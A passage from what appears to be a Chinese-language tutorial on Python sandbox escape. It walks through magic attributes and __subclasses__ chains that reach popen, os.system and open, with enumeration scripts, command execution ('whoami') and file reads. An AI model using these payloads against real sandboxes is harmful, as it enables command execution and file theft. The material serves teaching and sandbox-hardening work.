(built-in)&gt;\n在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径\n&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules[&#x27;os&#x27;]=&#x27;/usr/lib/python3.6/os.py&#x27;&gt;&gt;&gt; import os\n3. 魔法函数\npython沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。\n先看看几个常用的魔法函数\n__class__返回调用的类型class A():\tpass\ta = A()print(a.__class__)  #&lt;class &#x27;__main__.A&#x27;&gt;\n__mro__查看类继承的所有父类，直到objectclass A:\tpassclass B(A):\tpassclass C(A):\tpassclass D(B, C):\tpassprint(D.__mro__) #(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)\n__subclasses__获取类的所有子类class A(object):    passclass B(A):    passclass C(A):    pass    print(A.__subclasses__()) #[&lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;]\n__bases__返回所有直接父类组成的元组class A(object):\tpassclass B(A):\tpass\tprint(B.__bases__)  #(&lt;class &#x27;__main__.A&#x27;&gt;,)  不返回object类\n__init__类实例创建之后调用, 对当前对象的实例的一些初始化class A:\tdef __init__(self):        print(&#x27;ok&#x27;)         a = A()  # 输出ok\n__globals__能够返回函数所在模块命名空间的所有变量class A(object):\tdef __init__(self, a, b):\t\tself.a = a\t\tself.b = ba.__init__.__globals__&#123;&#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x0000000001692390&gt;, &#x27;importlib&#x27;: &lt;module &#x27;importlib&#x27; from &#x27;D:\\anaconda\\lib\\importlib\\__init__.pyc&#x27;&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;pattern&#x27;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#x27;base64&#x27;: &lt;module &#x27;base64&#x27; from &#x27;D:\\anaconda\\lib\\base64.pyc&#x27;&gt;, &#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;, &#x27;flag&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\anaconda\\lib\\os.pyc&#x27;&gt;, &#x27;__package__&#x27;: None, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\anaconda\\lib\\os.pyc&#x27;&gt;,&#x27;__doc__&#x27;: None, &#x27;match&#x27;: &lt;_sre.SRE_Match object at 0x00000000039A9B28&gt;&#125;\n__getattribute__当类被调用的时候，无条件进入此函数。__getattr__对象中不存在的属性时调用class A:\tdef __init__(self):        self.name = &quot;Bob&quot;\tdef __getattribute__(self,item):\t\tprint(&quot;ok&quot;)a = A()  a.name   #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。\tdef __getattr__(self):\t\tprint(&#x27;getattr&#x27;)a.age   #getattr  调用不存在的属性会执行，相当于处理了AttributeError。\n4. 类继承使用\n尝试利用继承关系来找到object类\n&quot;&quot;.__class__.__bases__   #(&lt;class &#x27;object&#x27;&gt;,)\n前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。\n[].__class__.__bases__&#123;&#125;.__class__.__bases__\n在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。\n&quot;&quot;.__class__.__bases__[0].__subclasses__()\n\n找到需要使用的类，其中有可以使用的类，在python3中使用\n&lt;class &#x27;os._wrap_close&#x27;&gt;,&lt;class &#x27;warnings.WarningMessage&#x27;&gt;\n调用他们\n&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128]&lt;class &#x27;os._wrap_close&#x27;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177]&lt;class &#x27;warnings.WarningMessage&#x27;&gt;\n如果子类过多，不好查找是第几个下标，可以使用如下来标记\nfor i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()):\tprint i\n\n先来读取一下文件，C盘下的win.ini文件\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__\n\n从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&quot;C:\\\\windows\\\\win.ini&quot;).read()#如果这里会报错添加__builtins__&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.__builtins__[&#x27;popen&#x27;](&quot;C:\\\\windows\\\\win.ini&quot;).read()\n如果想直接在终端显示出来\n&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](&quot;type C:\\\\windows\\\\win.ini&quot;).read()\n\n在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。\n().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].getline(&quot;C:\\\\windows\\\\win.ini&quot;,1)\n执行命令\n&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].os.system(&#x27;whoami&#x27;)misaki\\user\n但是python2如果使用字符串的形式，会报如下错误，因为__bases__获取的并不是object类\n&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59]Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;IndexError: list index out of range\n只需要再去获得一次即可\n&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59]&lt;class &#x27;warnings.WarningMessage&#x27;&gt;\n5. 特殊函数查找\n5.1 python3\n在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202)\nasynciocollectionsconcurrentctypescursesdbmdistutilsemailencodings......warnings.pywave.pyweakref.pywebbrowser.pyxdrlib.pyzipapp.pyzipfile.pyzipimport.py\n将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。\n# coding=UTF-8import codecsfrom collections import defaultdictwith codecs.open(&#x27;python.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:    modules = f.readlines()modules = [m.strip().replace(&#x27;.py&#x27;, &#x27;&#x27;) for m in modules]target_modules = [&#x27;os&#x27;, &#x27;platform&#x27;, &#x27;subprocess&#x27;, &#x27;timeit&#x27;, &#x27;importlib&#x27;, &#x27;codecs&#x27;, &#x27;sys&#x27;, &#x27;commands&#x27;]target_functions = [&#x27;__import__&#x27;, &#x27;__builtins__&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;file&#x27;, &#x27;open&#x27;, &#x27;codecs&#x27;]all_targets = target_modules + target_functionsresults = defaultdict(list)for m in modules:    try:        module = __import__(m)    except Exception as e:        # print(&#x27;ERROR:&#x27;, m)        pass    for t in all_targets:        if t in module.__dict__:            results[m.encode()].append(t)print(&quot;可利用模块数量为:&quot;+str(len(results)))for k, v in results.items():    print(k, v)\n筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选\nfind_modules = &#123;    &#125;target_modules = [&#x27;os&#x27;, &#x27;platform&#x27;, &#x27;subprocess&#x27;, &#x27;timeit&#x27;, &#x27;importlib&#x27;, &#x27;codecs&#x27;, &#x27;sys&#x27;]target_functions = [&#x27;__import__&#x27;, &#x27;__builtins__&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;file&#x27;, &#x27;open&#x27;]all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules = list(set(list(find_modules.keys()) + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()print(&#x27;----------1-----------&#x27;)for i, s in enumerate(sub_name):    for f in all_targets:        if f == s:            if f in target_functions:                print(i, f)            elif f in all_modules:                target = find_modules[f]                sub_dict = subclasses[i].__dict__                for t in target:                    if t in sub_dict:                        print(i, f, target)print(&#x27;----------2-----------&#x27;)# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__        for m in all_targets:            if m in more:                print(i, sub, m, find_modules.get(m))    except Exception as e:        passprint(&#x27;----------3-----------&#x27;)# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)for i, sub in enumerate(subclasses):    try:        more = sub.__init__.__globals__.values()        for j, v in enumerate(more):            for f in all_targets:                try:                    if f in v:                        if f in target_functions:                            print(i, j, sub, f)                        elif f in all_modules:                            target = find_modules.get(f)                            sub_dict = v[f].__dict__                            for t in target:                                if t in sub_dict:                                    print(i, j, sub, f, target)                except Exception as e:                    pass    except Exception as e:        passprint(&#x27;----------4-----------&#x27;)# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)# &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses):    try:        more = sub()._module.__builtins__        for f in all_targets:            if f in more:                print(i, f)    except Exception as e:        pass\n----------2-----------75 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; __builtins__ None75 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; __import__ None75 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; sys None76 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; __builtins__ None76 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; __import__ None76 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; sys None77 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; __builtins__ None77 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; __import__ None77 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; sys None78 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; __builtins__ None78 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; __import__ None78 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; sys None79 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; __builtins__ None79 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; __import__ None79 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; sys None91 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; __builtins__ None91 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; sys None92 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; __builtins__ None92 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; sys None93 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; __builtins__ None93 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; sys None95 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; __builtins__ None95 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; sys None103 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; __builtins__ None103 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; sys None103 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open None104 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; __builtins__ None104 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; sys None104 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open None105 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; __builtins__ None105 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; sys None105 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open None106 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; __builtins__ None106 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; sys None106 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open None128 &lt;class &#x27;os._wrap_close&#x27;&gt; __builtins__ None128 &lt;class &#x27;os._wrap_close&#x27;&gt; sys None128 &lt;class &#x27;os._wrap_close&#x27;&gt; open None129 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; __builtins__ None129 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; sys None130 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; __builtins__ None130 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; sys None137 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; __builtins__ None138 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; __builtins__ None139 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; __builtins__ None139 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; sys None140 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; __builtins__ None140 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; sys None167 &lt;class &#x27;reprlib.Repr&#x27;&gt; __builtins__ None174 &lt;class &#x27;functools.partialmethod&#x27;&gt; __builtins__ None176 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; __builtins__ None176 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; sys None177 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; __builtins__ None177 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; sys None----------3-----------75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; exec75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; eval75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; compile75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; __import__75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; open76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; exec76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; eval76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; compile76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; __import__76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; open77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; exec77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; eval77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; compile77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; __import__77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; open78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; exec78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; eval78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; compile78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; __import__78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; open79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; exec79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; eval79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; compile79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; __import__79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; open91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; exec91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; eval91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; compile91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; __import__91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; open92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; exec92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; eval92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; compile92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; __import__92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; open93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; exec93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; eval93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; compile93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; __import__93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; open95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; exec95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; eval95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; compile95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; __import__95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; open103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; exec103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; eval103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; compile103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; __import__103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open103 56 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; exec104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; eval104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; compile104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; __import__104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open104 56 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; exec105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; eval105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; compile105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; __import__105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open105 56 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; exec106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; eval106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; compile106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; __import__106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open106 56 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open128 1 &lt;class &#x27;os._wrap_close&#x27;&gt; exec128 1 &lt;class &#x27;os._wrap_close&#x27;&gt; file128 1 &lt;class &#x27;os._wrap_close&#x27;&gt; open128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; exec128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; eval128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; compile128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; __import__128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; open128 11 &lt;class &#x27;os._wrap_close&#x27;&gt; open129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; exec129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; eval129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; compile129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; __import__129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; open130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; exec130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; eval130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; compile130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; __import__130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; open137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; exec137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; eval137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; compile137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; __import__137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; open138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; exec138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; eval138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; compile138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; __import__138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; open139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; exec139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; eval139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; compile139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; __import__139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; open140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; exec140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; eval140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; compile140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; __import__140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; open167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; exec167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; eval167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; compile167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; __import__167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; open174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; exec174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; eval174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; compile174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; __import__174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; open176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; exec176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; eval176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; compile176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; __import__176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; open177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; exec177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; eval177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; compile177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; __import__177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 open\n筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上\n----------2-----------                                      103 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open None           104 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open None           105 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open None           106 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open None                128 &lt;class &#x27;os._wrap_close&#x27;&gt; open None                      ----------3-----------                                      75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; open           75 5 &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; exec           76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; open      76 5 &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt; exec      77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; open    77 5 &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt; exec    78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; open     78 5 &lt;class &#x27;_frozen_importlib._installed_safely&#x27;&gt; exec     79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; open            79 5 &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt; exec            91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; open   91 5 &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; exec   92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; open92 5 &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt; exec93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; open93 5 &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt; exec95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; open   95 5 &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt; exec   103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open              103 7 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; exec              103 56 &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt; open             104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open              104 7 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; exec              104 56 &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt; open             105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open              105 7 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; exec              105 56 &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt; open             106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open                   106 7 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; exec                   106 56 &lt;class &#x27;codecs.StreamRecoder&#x27;&gt; open                  128 1 &lt;class &#x27;os._wrap_close&#x27;&gt; open                         128 1 &lt;class &#x27;os._wrap_close&#x27;&gt; exec                         128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; open                         128 7 &lt;class &#x27;os._wrap_close&#x27;&gt; exec                         128 11 &lt;class &#x27;os._wrap_close&#x27;&gt; open                        129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; open                  129 7 &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt; exec                  130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; open                 130 7 &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt; exec                 137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; open            137 7 &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt; exec            138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; open                138 7 &lt;class &#x27;types._GeneratorWrapper&#x27;&gt; exec                139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; open                139 7 &lt;class &#x27;warnings.WarningMessage&#x27;&gt; exec                140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; open                140 7 &lt;class &#x27;warnings.catch_warnings&#x27;&gt; exec                167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; open                           167 7 &lt;class &#x27;reprlib.Repr&#x27;&gt; exec                           174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; open                174 7 &lt;class &#x27;functools.partialmethod&#x27;&gt; exec                176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; open176 7 &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt; exec177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; open              177 7 &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt; exec              ----------4-----------                                      140 open                                                    140 exec                                               \n既然筛选出来，那么选其中一个利用来读取文件：\n&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103]&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;\n完整执行\n&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#x27;open&#x27;](&quot;C:\\\\windows\\\\win.ini&quot;).read()&#x27;; for 16-bit app support\\n[fonts]\\n[extensions]\\n[mciextensions]\\n[files]\\n[Mail]\\nMAPI=1\\nCMCDLLNAME32=mapi32.dll\\nCMC=1\\nMAPIX=1\\nMAPIXVER=1.0.0.1\\nOLEMessaging=1\\n[xianshuabao]\\nclient_uuid=&#123;xxx&#125;\\n&#x27;\n执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。\n&gt;&gt;&gt; 